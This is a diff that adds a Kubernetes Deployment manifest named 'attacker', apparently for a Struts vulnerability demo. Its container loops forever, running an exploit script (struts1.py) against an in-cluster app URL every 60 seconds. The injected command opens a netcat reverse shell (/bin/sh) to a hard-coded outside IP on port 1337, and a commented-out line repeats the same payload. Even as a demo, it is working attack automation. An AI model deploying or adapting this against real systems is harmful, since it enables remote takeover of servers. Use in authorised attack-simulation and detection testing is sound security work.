@@ -1,0 +1,25 @@
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: attacker
+  namespace: ${struts_demo_ns:-struts}
+spec:
+  selector:
+    matchLabels:
+      app: attacker-pod
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: attacker-pod
+    spec:
+      containers:
+      - name: attacker-pod
+        image: skywalke34/struts
+#        command: ["/usr/bin/python3"]
+#        args: ["struts1.py","http://${struts_demo_name:-struts}.${clu_name}.${mydomain}/super-app/orders/3 'nc -nv 208.94.108.178 1337 -e /bin/sh"]
+        command: ["/bin/sh"]
+        args: ["-c","while true; do python3 struts1.py http://${struts_demo_name:-struts}.${clu_name}.${mydomain}/super-app/orders/3 'nc -nv 208.94.108.178 1337 -e /bin/sh' ; sleep 60; done"]
+
+...
